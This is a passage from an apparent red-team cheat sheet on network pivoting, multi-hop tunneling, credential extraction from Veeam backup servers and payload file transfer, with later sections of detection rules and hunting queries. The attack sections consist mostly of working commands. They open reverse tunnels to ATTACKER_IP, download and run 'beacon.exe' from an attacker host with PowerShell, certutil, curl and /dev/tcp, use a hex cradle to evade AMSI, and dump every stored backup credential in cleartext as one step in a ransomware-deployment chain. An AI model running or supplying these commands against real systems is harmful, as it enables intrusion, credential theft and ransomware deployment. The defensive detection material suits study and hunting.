# Enterprises increasingly federate identities across clouds; mis-
# configured trust relationships = cross-cloud lateral via the
# federation control plane rather than cloning credentials.

# DETECTION: Cloud Audit Logs (Admin Activity, Data Access).
#   Cloud Audit Logs surface metadata-token requests from non-VM IPs
#   if the token is replayed externally. WIF token exchanges are
#   logged but the noise level varies.
```

---

## 10 — NETWORK PIVOTING & TUNNELING

```bash
# ═══════════════════════════════════════════════════════════
# CHISEL (Fast TCP/UDP tunnel — Go binary, cross-platform)
# ═══════════════════════════════════════════════════════════
# On attacker (server mode):
chisel server --reverse --port 8080
# On target (client — connects back, creates reverse SOCKS on attacker):
chisel client ATTACKER_IP:8080 R:socks
# Now SOCKS5 proxy available on attacker localhost:1080
# Use with proxychains: proxychains nxc smb 10.0.0.0/24 -u admin -p pass
#
# Specific port forward (instead of full SOCKS):
chisel client ATTACKER_IP:8080 R:8445:10.0.0.5:445
# Forwards attacker:8445 → target-network:10.0.0.5:445
#
# OPSEC: Single encrypted TCP connection, looks like HTTPS traffic
# DETECTION: Unusual outbound connections to non-standard ports
# JA3/JA4 CAVEAT: Network-side TLS fingerprinting (JA3, JA3S, JA4)
#   identifies Chisel by its Go HTTP/Websocket client signature,
#   distinct from real browser HTTPS clients. Mature network defenders
#   (Zeek, Suricata, Corelight, ExtraHop) match on JA3/JA4 to detect
#   tunneling tools regardless of port. To reduce signature: build
#   Chisel with TLS hardening forks, or use through a legitimate-
#   fingerprint front (Cloudflare tunnel, see below).

# ═══════════════════════════════════════════════════════════
# LIGOLO-NG (Modern pivoting — TUN interface, no SOCKS needed)
# ═══════════════════════════════════════════════════════════
# On attacker (proxy server):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# On target (agent — connects back):
ligolo-agent -connect ATTACKER_IP:11601 -retry -ignore-cert
# In ligolo proxy console:
session                                        # List connected agents
start                                          # Start tunnel for selected session
# Add route on attacker to reach target's network:
sudo ip route add 10.0.0.0/24 dev ligolo
# Now access internal network directly — no proxychains needed:
nxc smb 10.0.0.0/24 -u admin -p password
nmap -sT -Pn 10.0.0.0/24
# Port forward (expose internal service on attacker):
listener_add --addr 0.0.0.0:1234 --to 10.0.0.5:445 --tcp
#
# WHY LIGOLO > CHISEL: Creates actual TUN interface, so all tools work
#   natively without proxychains. Faster, more stable for heavy scanning.
# OPSEC: Encrypted connection, looks like TLS traffic
# DETECTION: Unusual outbound TLS to non-standard port, unexpected TUN interfaces on target
# JA3/JA4 CAVEAT: Same as Chisel — Ligolo's Go-based TLS client has
#   identifiable JA3/JA4 fingerprint distinct from browsers. Mature
#   network telemetry catches this regardless of port choice.

# ═══════════════════════════════════════════════════════════
# CLOUDFLARE TUNNEL / NGROK / TAILSCALE (Legitimate Tunneling Abuse)
# ═══════════════════════════════════════════════════════════
# When network egress filtering is strict but Cloudflare/Ngrok/Tailscale
# are allowed (common in dev environments and remote work), abuse the
# legitimate service for C2 + lateral pivot infrastructure:
#
# Cloudflare Tunnel (cloudflared):
#   On compromised host: cloudflared tunnel run --token <attacker_token>
#   Establishes outbound HTTPS to *.cloudflareaccess.com — appears as
#   legitimate Cloudflare service traffic. Attacker's Cloudflare account
#   provides the receiving end.
#   Documented APT abuse: LemonDuck, multiple ransomware affiliates.
#
# Ngrok:
#   On target: ngrok tcp 22  →  exposes target's SSH publicly via
#   *.ngrok.io. Operator connects to the ngrok URL.
#
# Tailscale:
#   Compromised host joins attacker-controlled Tailnet → mesh VPN
#   access without inbound firewall changes. Used in confirmed
#   intrusions throughout 2023-2025.
#
# OPSEC: VERY HIGH — traffic to legitimate well-known services rarely
#   flagged. JA3/JA4 fingerprint matches the legitimate client (because
#   it IS the legitimate client). Detection requires application-layer
#   inspection (Cloudflared process running on a server that has no
#   business hosting tunnels) or DNS pattern hunting on cloudflareaccess
#   subdomains.

# ═══════════════════════════════════════════════════════════
# SSH TUNNELING (T1572)
# ═══════════════════════════════════════════════════════════
# Local port forward (access remote service through pivot):
ssh -L 8445:10.0.0.5:445 user@pivot_host -N
# Now: smbclient //localhost/C$ -p 8445 → reaches 10.0.0.5:445
# Or for Impacket: impacket-smbclient admin@localhost -port 8445
#
# Dynamic SOCKS proxy (access entire internal network):
ssh -D 1080 user@pivot_host -N
# proxychains nxc smb 10.0.0.0/24 ...
#
# Remote port forward (expose attacker service to internal network):
ssh -R 8080:localhost:80 user@pivot_host -N
# Internal hosts can reach attacker's port 80 via pivot_host:8080
#
# SSH ProxyJump (multi-hop without intermediate shell):
ssh -J user@jumphost1,user@jumphost2 user@final_target
# Or in ~/.ssh/config:
# Host final_target
#   ProxyJump user@jumphost1,user@jumphost2
#
# OPSEC: SSH traffic is expected, encrypted, and well-understood
# DETECTION: Unusual SSH tunneling flags (-D/-L/-R/-N), long-lived SSH sessions

# ═══════════════════════════════════════════════════════════
# SSHUTTLE (VPN-like access over SSH — no root on pivot)
# ═══════════════════════════════════════════════════════════
# Transparently routes all traffic for specified subnets through SSH:
sshuttle -r user@pivot_host 10.0.0.0/24 172.16.0.0/16
# All traffic to those subnets now goes through pivot_host
# No proxychains needed — works transparently with any tool
# Requires: root on LOCAL machine (for iptables/pf), SSH access on pivot
#
# OPSEC: Appears as SSH traffic only
# DETECTION: SSH session with sustained data transfer, iptables changes on local machine

# ═══════════════════════════════════════════════════════════
# RPIVOT (Reverse SOCKS proxy — Python)
# ═══════════════════════════════════════════════════════════
# When target can reach attacker but not vice-versa:
# On attacker (server):
python3 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
# On target (client — connects back):
python3 client.py --server-ip ATTACKER_IP --server-port 9999
# SOCKS proxy on attacker:1080 → routes through target

# ═══════════════════════════════════════════════════════════
# METASPLOIT PIVOTING
# ═══════════════════════════════════════════════════════════
# Autoroute (add route through Meterpreter session):
meterpreter> run post/multi/manage/autoroute SUBNET=10.0.0.0 NETMASK=255.255.255.0
# SOCKS proxy for external tools:
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
# Port forward through session:
meterpreter> portfwd add -l 3389 -p 3389 -r 10.0.0.5
# Now: xfreerdp /v:127.0.0.1 → reaches 10.0.0.5:3389

# ═══════════════════════════════════════════════════════════
# C2-NATIVE SOCKS PIVOTING (preferred — no extra binaries)
# ═══════════════════════════════════════════════════════════
# Major C2 frameworks all provide SOCKS pivoting through an active
# implant — operationally the cleanest pivoting because no Chisel/
# Ligolo binaries hit disk on the target, and JA3/JA4 fingerprint
# matches the C2 framework (one fingerprint to harden, not multiple).
#
# COBALT STRIKE (commercial — commercial license required):
# In beacon console:
beacon> socks 1080
# Establishes a SOCKS4a proxy on the team server localhost:1080
# tunneled through this beacon to the target's network.
# All operator tools (proxychains, browser, etc.) run through the
# beacon's network position. Stop with: socks stop
#
# SLIVER (open source, BishopFox):
sliver (target) > socks5 start
# [+] Started SOCKS5 127.0.0.1:1081
# Same model as CS but via Sliver implant.
# Stop with: socks5 stop ID
#
# HAVOC (open source, C5pider):
havoc (demon) > socks add 1080
# Demon-tunneled SOCKS5 — same operational pattern.
# Multiple demons → multiple simultaneous SOCKS endpoints for
# multi-network access.
#
# MYTHIC (open source, multi-agent framework):
# Most Mythic agents (Apollo, Apfell, Athena) include socks command:
[mythic] > socks 1090
# Routes through the agent's Mythic command-and-control connection
# back to the team server.
#
# OUTFLANK STAGE 1 (commercial):
# Provides similar SOCKS via beacon, plus port-forward primitives
# tuned for OPSEC (no Go stdlib HTTP signature).
#
# OPSEC ADVANTAGE: The C2 channel itself is the only network signature
# — no additional outbound connections, no second binary. JA3/JA4 of
# the C2 channel is a single artifact to harden (via custom uTLS
# profiles in Sliver / custom Malleable C2 profile in CS).
# Operationally this is what nation-state operators run; the Chisel/
# Ligolo entries above are kept for engagements without commercial
# C2 access or for explicit out-of-band tunneling.

# ═══════════════════════════════════════════════════════════
# WIREGUARD PIVOTING (kernel-mode tunneling)
# ═══════════════════════════════════════════════════════════
# Once attacker has root on a Linux pivot host (or admin on Windows
# with WireGuard installed), establishing a WireGuard tunnel between
# attacker and pivot creates a fast kernel-mode VPN that all subsequent
# tools route through transparently.
#
# Setup (on pivot, Linux):
# 1. Install wireguard-tools (often already present on hardened distros)
# 2. Generate keypair on both sides:
wg genkey | tee privatekey | wg pubkey > publickey
# 3. Configure /etc/wireguard/wg0.conf on pivot:
[Interface]
PrivateKey = <pivot_priv>
Address = 10.99.0.2/24
[Peer]
PublicKey = <attacker_pub>
Endpoint = ATTACKER_IP:51820
AllowedIPs = 10.99.0.0/24
PersistentKeepalive = 25
# 4. wg-quick up wg0 — tunnel established
# 5. Add routes on attacker side for target subnets via wg0
#
# OPSEC ADVANTAGES vs Chisel/Ligolo:
# - Kernel-mode = much faster than user-space SOCKS proxies for
#   heavy scanning operations (Bloodhound collection, Nmap full
#   port range against /16)
# - UDP transport (default port 51820) — looks different from TLS
#   tunneling tools, doesn't match Chisel/Ligolo JA3/JA4
# - Encryption is standard ChaCha20-Poly1305 — strong, modern, no
#   weak-fingerprint TLS handshake
# OPSEC DISADVANTAGES:
# - Requires kernel module / WireGuard support on pivot
# - UDP 51820 (or any non-standard UDP) is itself anomalous in
#   environments that egress-filter UDP
# - On Windows pivots, requires WireGuardNT.sys driver — visible
#   in Sysmon Event 6 (driver loaded) on first install
#
# OPERATOR PATTERN: combine WireGuard with cloudflared front (see
# below) — cloudflared as the egress fingerprint, WireGuard
# encapsulated inside for kernel-mode performance.

# ═══════════════════════════════════════════════════════════
# DNS TUNNELING (Covert channel — bypasses most firewalls)
# ═══════════════════════════════════════════════════════════
# dnstt (David Fifield, maintained — modern alternative to dnscat2/iodine):
# Encodes traffic in DNS-over-HTTPS or DNS-over-TLS to public resolvers,
# making the tunnel look like normal modern DNS.
# Server: dnstt-server -dns DOMAIN -privkey-file priv.key -udp :53 ATTACKER_IP:8000
# Client: dnstt-client -doh https://dns.google/dns-query DOMAIN 127.0.0.1:1080
# Then connect through localhost:1080 SOCKS proxy.
#
# Older / unmaintained alternatives (kept here for reference, not recommended):
# dnscat2 (iagox86, last commit ~2018):
# On attacker: ruby dnscat2.rb --dns "domain=c2.attacker.com,host=0.0.0.0"
# On target: ./dnscat2 c2.attacker.com
# iodine (yarrick, last commit ~2017):
# Server: iodined -c -P password 10.0.0.1 tunnel.attacker.com
# Client: iodine -P password tunnel.attacker.com
#
# All DNS tunneling is very slow but works when other egress is blocked.
# Modern DoH-based tunneling (dnstt) is significantly less detectable
# than legacy DNS-only tunneling because the actual DNS query goes to
# a public resolver, not the attacker's domain.
#
# DETECTION: High-volume DNS queries, long TXT records, unusual query
#   patterns. DoH-based tunneling additionally requires DNS-over-HTTPS
#   policy enforcement (block or proxy) — many enterprises don't, leaving
#   dnstt undetectable at the DNS layer.
# OPSEC RATING: HIGH stealth in DoH-permissive environments; MEDIUM for
#   classical DNS tunneling against modern DNS anomaly detection.
```

---

## 11 — MULTI-HOP PIVOTING

```bash
# ═══════════════════════════════════════════════════════════
# CONCEPT: Attacker → Host A → Host B → Host C → Target
# ═══════════════════════════════════════════════════════════
# Each hop requires a tunnel or proxy chain through the previous hop.

# === SSH MULTI-HOP (simplest) ===
ssh -J user@hostA,user@hostB user@target
# Automatically chains SSH connections through each jump host

# === CHISEL CHAIN ===
# Hop 1: Attacker → Host A
# On attacker: chisel server --reverse --port 8080
# On Host A: chisel client ATTACKER:8080 R:socks
# → SOCKS5 on attacker:1080 (reaches Host A's network)
#
# Hop 2: Host A → Host B (Host B's network access through Host A)
# On Host A: chisel server --reverse --port 9090
# On Host B: chisel client HOST_A:9090 R:socks
# → SOCKS5 on Host A:1080 (reaches Host B's network)
# To use from attacker: forward Host A's SOCKS port back through Hop 1:
# On Host A: chisel client ATTACKER:8080 R:1081:127.0.0.1:1080
# → Now attacker has SOCKS on :1080 (Host A's net) and :1081 (Host B's net)
# Configure proxychains to chain: socks5 127.0.0.1 1080 then socks5 127.0.0.1 1081

# === LIGOLO-NG MULTI-PIVOT ===
# Ligolo supports double-pivoting natively:
# Agent on Host A connects to proxy on attacker
# Agent on Host B connects through Host A's tunnel to reach attacker
# In ligolo proxy: each agent appears as a separate session
# Add routes for each subnet: ip route add 172.16.0.0/24 dev ligolo

# === PROXYCHAINS CONFIGURATION ===
# /etc/proxychains4.conf for chaining:
# [ProxyList]
# socks5 127.0.0.1 1080     # First hop (SOCKS from Chisel/Ligolo)
# socks5 127.0.0.1 1081     # Second hop (if double-pivot)
#
# For strict chain (fail if any proxy down):
# strict_chain
# For dynamic chain (skip failed proxies):
# dynamic_chain

# ═══════════════════════════════════════════════════════════
# VEEAM / BACKUP-INFRASTRUCTURE PIVOT — NEW (G5)
# Akira / Black Basta / Hunters International SOP 2024-2025
# MITRE ATT&CK: T1199 (Trusted Relationship) + T1212 (Exploitation
# for Credential Access) + T1078 (Valid Accounts)
# STEALTH: MEDIUM (Veeam server activity expected) | SUCCESS: HIGH | SKILL: MED
# ═══════════════════════════════════════════════════════════
# Veeam Backup & Replication (B&R) is the credential-vault pivot for
# the entire enterprise. A typical Veeam server stores credentials for:
# - Domain Admin (or DA-equivalent) for VM guest backup operations
# - ESXi root for VMware vSphere integration
# - NetApp / Dell / HPE / Pure Storage admin for SAN snapshot integration
# - SQL service accounts for application-aware backup
# - Cloud (AWS/Azure/GCP) IAM credentials for cloud backup
# Compromise = instant lateral to every critical infrastructure tier.
#
# IDENTIFICATION:
# - Hostname pattern: VEEAM*, BACKUP*, BR-*
# - Service: VeeamBackupSvc, VeeamBrokerSvc
# - SQL: VEEAMSQL2016 / VEEAMSQL2019 instance (default sysadmin =
#   VEEAM service account)
# - Process: Veeam.Backup.Manager.exe (running as service)
# - Default ports: 9392 (Backup), 9393, 9401 (Cloud Gateway)
#
# CREDENTIAL EXTRACTION PATHS:
#
# 1. EXPLOIT-BASED RCE (most reliable when patched late):
# CVE-2024-40711 (Veeam B&R RCE, CVSS 9.8, September 2024)
#   - Pre-auth deserialization in VeeamHax service
#   - Mass-exploited Q4 2024
#   - Source: https://www.veeam.com/kb4649
# CVE-2024-40713 — companion authenticated RCE
# CVE-2025-23120 (Veeam B&R deserialization, March 2025)
#   - Authenticated user deserialization → RCE as Veeam service
#   - Ransomware groups operationalized within 48h of public PoC
#   - Source: https://www.veeam.com/kb4724
#
# 2. CONFIG DB CREDENTIAL EXTRACTION (when you have SYSTEM on Veeam server):
# Veeam stores credentials in its SQL config DB, encrypted with DPAPI
# under the Veeam service account. With SYSTEM:
# - Open SSMS to local VEEAMSQL instance
# - Query [VeeamBackup].[dbo].[Credentials] table
# - For each row, extract encrypted_password column
# - Run sadshade/veeam-creds Veeam-Get-Creds.ps1 (uses Veeam's own
#   decryption methods to unwrap → cleartext)
git clone https://github.com/sadshade/veeam-creds
# Inside Veeam server, as SYSTEM:
.\Veeam-Get-Creds.ps1
# Output: every backup-target credential in cleartext. Domain admin,
# ESXi root, NAS admin, cloud IAM keys.
#
# OPERATOR LATERAL CHAIN (typical Akira-pattern):
# 1. AD foothold (any low-priv user on a workstation)
# 2. BloodHound CE → identify Veeam server (often Tier 1)
# 3. Lateral to Veeam server
# 4. SYSTEM on Veeam server (LSASS dump or service account)
# 5. Veeam-Get-Creds.ps1 → ESXi root + DA + storage admin
# 6. Lateral to ESXi via vSphere API (cross-ref §16)
# 7. Push ransomware to all VMs in single operation
#
# DETECTION: Veeam audit log; SSMS access to VeeamBackup database from
#   non-Veeam-process context; Sysmon Event 10 (process access) with
#   target Veeam.Backup.Manager.exe from non-system processes.
#   MDE Q1 2026 added "Suspected Veeam credential extraction" detection.
# OPSEC RATING: MEDIUM — most orgs consider Veeam a "backup appliance"
#   not Tier 0; monitoring is typically weak.

# ═══════════════════════════════════════════════════════════
# SCANNING THROUGH PIVOTS
# ═══════════════════════════════════════════════════════════
# Proxychains + nmap (TCP connect only — no SYN scan through SOCKS):
proxychains nmap -sT -Pn -n --top-ports 100 10.0.0.0/24
# IMPORTANT: -sT (TCP connect) is REQUIRED through SOCKS — -sS does not work
# -Pn: don't ping (ICMP doesn't work through SOCKS)
# -n: no DNS resolution (avoids DNS leaks)
#
# Faster: use nxc for service-specific scanning through SOCKS:
proxychains nxc smb 10.0.0.0/24 -u '' -p ''
#
# With Ligolo-ng (no proxychains needed — direct access):
nmap -sT -Pn 10.0.0.0/24                    # Works natively through TUN interface
nxc smb 10.0.0.0/24 -u admin -p password    # Direct access
#
# Static nmap on pivot host (avoids proxy limitations):
# Upload statically compiled nmap to pivot host, scan from there
```

---

## 12 — FILE TRANSFER DURING LATERAL MOVEMENT

```bash
# ═══════════════════════════════════════════════════════════
# WINDOWS → WINDOWS
# ═══════════════════════════════════════════════════════════
# SMB copy (most common in AD environments):
copy C:\tools\beacon.exe \\10.0.0.5\C$\Windows\Temp\beacon.exe
xcopy C:\tools\ \\10.0.0.5\C$\Windows\Temp\tools\ /E /Y
# PowerShell Copy-Item to remote session:
$s = New-PSSession -ComputerName 10.0.0.5 -Credential $cred
Copy-Item -Path C:\tools\beacon.exe -Destination C:\Users\Public\ -ToSession $s
# Evil-WinRM upload/download:
upload /tmp/beacon.exe C:\Users\Public\beacon.exe
download C:\secrets.txt /tmp/secrets.txt

# ═══════════════════════════════════════════════════════════
# ATTACKER → WINDOWS (File download methods on target)
# ═══════════════════════════════════════════════════════════
# PowerShell — classic cradle (AMSI-flagged on PS5.1+ with strict
# transcription / ScriptBlock logging — every modern Defender / EDR):
(New-Object Net.WebClient).DownloadFile('http://attacker/beacon.exe','C:\Users\Public\beacon.exe')
Invoke-WebRequest -Uri http://attacker/beacon.exe -OutFile C:\Users\Public\beacon.exe
#
# Modern AMSI-aware alternatives:
# - Invoke-RestMethod (less commonly hunted than Invoke-WebRequest):
Invoke-RestMethod -Uri http://attacker/b.exe -OutFile C:\Users\Public\b.exe
# - curl.exe (built-in since Windows 10 1803 — note this is Microsoft's
#   curl.exe alias for curl, NOT the PowerShell curl alias for
#   Invoke-WebRequest. The alias was removed in PS 6+. On modern
#   Windows the curl.exe binary is at C:\Windows\System32\curl.exe):
curl.exe -o C:\Users\Public\beacon.exe http://attacker/beacon.exe
# - certutil (DETECTED by most EDR — use as last resort):
certutil -urlcache -split -f http://attacker/beacon.exe C:\Users\Public\beacon.exe
# - bitsadmin (DEPRECATED since Windows 10; Microsoft recommends
#   Start-BitsTransfer cmdlet instead. Still functional but deprecation
#   warning in execution logs):
bitsadmin /transfer job http://attacker/beacon.exe C:\Users\Public\beacon.exe
# - Start-BitsTransfer (modern PowerShell BITS — same BITS service,
#   newer interface, slightly less hunted):
Start-BitsTransfer -Source http://attacker/beacon.exe -Destination C:\Users\Public\beacon.exe
#
# Embedded base64 (no network egress required if you can paste payload):
# On attacker: base64 -w0 beacon.exe → copy long string
# On target via existing C2 channel — pure PowerShell decode:
[IO.File]::WriteAllBytes("C:\beacon.exe",[Convert]::FromBase64String("<BASE64_STRING>"))
# certutil decode variant:
certutil -decode beacon.b64 beacon.exe
#
# Hex-encoded mass replacement (when AMSI strips the obvious cradle):
$h = "PEXEBYTES_HEX"
[IO.File]::WriteAllBytes("C:\b.exe", -split $h -replace '..', '0x$&,' | iex)
# (Constructs byte array from hex pairs at runtime — defeats some
# string-pattern AMSI checks but ScriptBlock logging still captures
# the cleartext.)
#
# OPSEC NOTE: All in-process PowerShell cradles are visible to
# ScriptBlock logging (Event 4104) and AMSI when those are enabled.
# Modern defenders enable both by default. The reliable evasion is
# either (1) C2-native file transfer through existing implant — no
# new PowerShell process spawn; or (2) full AMSI bypass before cradle
# execution — see Privesc cheatsheet credential extraction section
# for current AMSI bypass viability.

# ═══════════════════════════════════════════════════════════
# LINUX → LINUX / ATTACKER → LINUX
# ═══════════════════════════════════════════════════════════
# scp (over SSH):
scp beacon user@10.0.0.5:/tmp/beacon
# wget / curl:
wget http://attacker/beacon -O /tmp/beacon && chmod +x /tmp/beacon
curl -o /tmp/beacon http://attacker/beacon && chmod +x /tmp/beacon
# Python HTTP server (on attacker — quick file hosting):
python3 -m http.server 80
# nc/ncat file transfer (no HTTP needed):
# Attacker: nc -lvp 4444 < beacon
# Target: nc attacker_ip 4444 > /tmp/beacon
# Base64 through command execution:
# Attacker: base64 -w0 beacon → copy output
# Target: echo "<BASE64>" | base64 -d > /tmp/beacon && chmod +x /tmp/beacon
# /dev/tcp (bash built-in, no external tools):
bash -c 'cat < /dev/tcp/ATTACKER_IP/4444 > /tmp/beacon'

# ═══════════════════════════════════════════════════════════
# OPSEC: FILE TRANSFER DETECTION
# ═══════════════════════════════════════════════════════════
# MOST DETECTED: certutil download, PowerShell WebClient, bitsadmin
# MODERATE: curl/wget (common on Linux, less suspicious)
# LEAST DETECTED: SMB copy (normal enterprise traffic), scp, base64 decode
# BEST PRACTICE: Use existing protocols (SMB in AD, SCP on Linux)
#   rather than introducing HTTP downloads which generate proxy/firewall logs
```

---

## 13 — LINUX: OPSEC & DETECTION REFERENCE

```
LATERAL MOVEMENT DETECTION SIGNATURES (Linux):
──────────────────────────────────────────────────────────────
TECHNIQUE                │ KEY LOG SOURCE                  │ NETWORK
─────────────────────────┼─────────────────────────────────┼──────────────────
SSH credential auth      │ /var/log/auth.log + journald    │ TCP 22
SSH key auth             │ /var/log/auth.log               │ TCP 22
SSH agent hijack         │ auditd watch on /tmp/ssh-*      │ TCP 22 outbound
SSH ProxyCommand abuse   │ FIM on ~/.ssh/config + auditd   │ Outbound varies
sudo abuse               │ /var/log/auth.log + sudo log    │ Local
Container escape         │ Falco + auditd syscall events   │ Local + node
Ansible push             │ /var/log/syslog (sudo via ssh)  │ TCP 22 + many
SaltStack master push    │ /var/log/salt/master + minion   │ TCP 4505/4506
Puppet agent fetch       │ /var/log/puppetlabs/puppet      │ TCP 8140
Redis CONFIG SET         │ Redis ACL log (Redis 6.0+)      │ TCP 6379
PostgreSQL pg_*          │ PostgreSQL log_statement=all    │ TCP 5432
MSSQL xp_cmdshell        │ MSSQL audit + EXTENDED EVENTS   │ TCP 1433
Kubernetes kubectl exec  │ K8s API audit log               │ TCP 6443
K8s privileged pod create│ K8s API audit + admission webhk │ TCP 6443

STEALTH RANKING (quietest → noisiest):
  1. SSH ProxyCommand abuse (passive — fires on user's next ssh)
  2. SSH key reuse (looks like normal user activity)
  3. RMM-equivalent CM tool execution (Ansible looks like automation)
  4. Container escape via known capability/mount (no network noise)
  5. SSH credential auth (auth log entry but normal pattern)
  6. K8s lateral via SA token (cluster-internal — depends on audit)
  7. Sudo escalation (user-attributed, baseline-comparable)
  8. Redis/Memcached unauth abuse (service log entries)
  9. Mass SaltStack salt '*' cmd.run (extremely visible)
 10. Mass Ansible -m shell across many hosts (visible per-host)

HUNTING RULES (auditd / osquery / Falco):

# === auditd: monitor ~/.ssh/config writes ===
# /etc/audit/rules.d/ssh-config.rules:
-w /home -p wa -k ssh_config_change
# Then alert on syscall events with key=ssh_config_change AND path
# matching */.ssh/config OR */.ssh/known_hosts

# === auditd: SSH agent socket access by non-owner ===
-a always,exit -F arch=b64 -S connect -F dir=/tmp/ssh-* -k ssh_agent_hijack

# === osquery: detect SUID escalation candidates and recent sudo abuse ===
SELECT path, mode, uid, gid FROM file
  WHERE directory = '/usr/local/bin' AND mode LIKE '%4%';
SELECT username, command, datetime FROM sudo_log
  WHERE datetime > strftime('%Y-%m-%d', 'now', '-1 day');

# === osquery: Kubernetes admin actions from a pod ===
SELECT * FROM processes
  WHERE name = 'kubectl' OR cmdline LIKE '%kubernetes.io/serviceaccount%';

# === Falco: shell in container (typically not legit) ===
- rule: Shell in Container
  desc: Notice shell activity within a container
  condition: container.id != host and proc.name in (shell_binaries)
  output: "Shell spawned in container (user=%user.name container=%container.name)"
  priority: WARNING

# === Falco: privileged pod creation ===
- rule: Create Privileged Pod
  desc: Detect creation of pod with privileged: true
  condition: kevt and pod and kcreate and ka.req.pod.containers.privileged intersects (true)
  output: "Privileged pod created (user=%ka.user.name pod=%ka.req.pod.name)"
  priority: CRITICAL

# === Falco: kubectl exec into pod (lateral) ===
- rule: Kubectl Exec
  desc: Detect kubectl exec into a pod
  condition: kevt and pod_subresource and ka.uri.param[command] != ""
  output: "kubectl exec invoked (user=%ka.user.name target=%ka.target.pod.name cmd=%ka.uri.param[command])"
  priority: WARNING

# === Falco: SUID binary spawn (escape candidate) ===
- rule: SUID Binary Spawn
  desc: A SUID-flagged binary spawned a shell or executed
  condition: spawned_process and proc.is_setuid and proc.name in (shell_binaries)
  output: "SUID binary spawned shell (proc=%proc.name parent=%proc.pname user=%user.name)"
  priority: NOTICE

# === KQL (Sentinel — Linux Syslog ingestion) ===
// Anomalous SSH source for a given user (lateral movement candidate)
Syslog
| where Facility == "auth" and SyslogMessage has "Accepted publickey"
| extend User = extract(@"for (\w+) from", 1, SyslogMessage)
| extend SourceIP = extract(@"from (\d+\.\d+\.\d+\.\d+)", 1, SyslogMessage)
| where isnotempty(User) and isnotempty(SourceIP)
| join kind=leftanti (Syslog
    | where TimeGenerated between (ago(60d) .. ago(7d))
    | where Facility == "auth" and SyslogMessage has "Accepted publickey"
    | extend BaselineUser = extract(@"for (\w+) from", 1, SyslogMessage)
    | extend BaselineIP = extract(@"from (\d+\.\d+\.\d+\.\d+)", 1, SyslogMessage)
    | distinct Computer, BaselineUser, BaselineIP)
    on Computer, $left.User == $right.BaselineUser, $left.SourceIP == $right.BaselineIP
| project TimeGenerated, Computer, User, SourceIP

// Container escape via /proc/*/root mount (Falco signal forwarded to Sentinel)
Falco_CL
| where Rule_s in ("Container Escape via Mount", "Privileged Pod",
                    "Sensitive Mount in Container")
| project TimeGenerated, Hostname_s, Pod_s, Container_s, Rule_s, Output_s
```

---

## 14 — CLOUD: OPSEC & DETECTION REFERENCE

```
LATERAL MOVEMENT DETECTION SIGNATURES (Cloud):
──────────────────────────────────────────────────────────────
TECHNIQUE                       │ KEY LOG SOURCE
────────────────────────────────┼─────────────────────────────────────
AWS sts:AssumeRole              │ CloudTrail "AssumeRole" event
AWS ssm:SendCommand             │ CloudTrail "SendCommand"
AWS ec2-instance-connect        │ CloudTrail "SendSSHPublicKey"
AWS Lambda layer poisoning      │ CloudTrail "PublishLayerVersion" +
                                │   "UpdateFunctionConfiguration"
AWS CloudFormation StackSet     │ CloudTrail "CreateStackSet" +
                                │   "CreateStackInstances"
AWS GetFederationToken          │ CloudTrail "GetFederationToken"
Azure Managed Identity token req│ Azure Activity Log + IMDS access
Azure cross-subscription pivot  │ Azure Activity Log "Subscription" ops
Azure SP creation/cred-add      │ Entra ID audit log "Add member to app"
                                │   "Add credentials to application"
Entra ID PRT replay             │ Entra sign-in log; non-interactive
                                │   sign-in from new IP/UA
Azure Function App deploy       │ Azure Activity Log "WEBSITES/zipdeploy"
Azure Logic App workflow modify │ Azure Activity Log "workflows/write"
GCP SA impersonation            │ Cloud Audit "GenerateAccessToken"
GCP IAP tunnel                  │ Cloud Audit "iap.AuthorizeUser"
GCP metadata token request      │ Cloud Audit (limited surface)
GCP Workload Identity Federation│ Cloud Audit "GenerateAccessToken" w/
                                │   external account credential

STEALTH RANKING (quietest → noisiest):
  1. PRT/refresh token replay from new IP (unless CA risk policy)
  2. Cross-subscription pivot via existing assumed role
  3. Managed identity token request from compromised VM
  4. SA impersonation chain (GCP)
  5. Lambda layer poisoning (no per-invocation alert)
  6. SSM SendCommand single instance
  7. Mass SSM SendCommand fan-out
  8. CloudFormation StackSet org-wide deployment
  9. New SP creation in Entra ID (high audit signal)
 10. Cross-cloud federation exchange from anomalous source

HUNTING QUERIES (KQL — Sentinel multi-cloud):

// Entra ID PRT replay — non-interactive sign-in from new IP
SigninLogs
| where ResultType == 0   // success
| where IsInteractive == false
| extend SourceIPHash = strcat(IPAddress, "|", UserPrincipalName)
| join kind=leftanti (SigninLogs
    | where TimeGenerated between (ago(60d) .. ago(7d))
    | where ResultType == 0
    | extend BaselineHash = strcat(IPAddress, "|", UserPrincipalName)
    | distinct BaselineHash) on $left.SourceIPHash == $right.BaselineHash
| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName,
          UserAgent, RiskLevelDuringSignIn, AuthenticationDetails

// Service Principal credential addition (potential SP backdoor for
// cross-tenant or cross-app lateral)
AuditLogs
| where OperationName in~ ("Add app role assignment to service principal",
                            "Update application certificates and secrets",
                            "Add service principal credentials")
| where Result == "success"
| extend Initiator = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetSP = tostring(TargetResources[0].displayName)
| project TimeGenerated, OperationName, Initiator, TargetSP,
          InitiatedBy, TargetResources

// AWS — anomalous AssumeRole from unfamiliar source IP
AWSCloudTrail
| where EventName == "AssumeRole"
| where ErrorCode == ""
| extend Caller = tostring(UserIdentityUserName)
| extend SourceIP = tostring(SourceIpAddress)
| join kind=leftanti (AWSCloudTrail
    | where TimeGenerated between (ago(60d) .. ago(7d))
    | where EventName == "AssumeRole" and ErrorCode == ""
    | extend BaselineCaller = tostring(UserIdentityUserName)
    | extend BaselineIP = tostring(SourceIpAddress)
    | distinct BaselineCaller, BaselineIP)
    on $left.Caller == $right.BaselineCaller, $left.SourceIP == $right.BaselineIP
| project TimeGenerated, Caller, SourceIP, RequestParameters,
          ResponseElements

// AWS — Lambda layer + function update within short window (poisoning)
AWSCloudTrail
| where EventName == "PublishLayerVersion"
| extend LayerName = tostring(parse_json(RequestParameters).layerName)
| extend Caller = tostring(UserIdentityUserName)
| join kind=inner (AWSCloudTrail
    | where EventName == "UpdateFunctionConfiguration"
    | extend Layers = tostring(parse_json(RequestParameters).layers)
    | extend Caller2 = tostring(UserIdentityUserName)
    | extend FnName = tostring(parse_json(RequestParameters).functionName))
    on $left.Caller == $right.Caller2
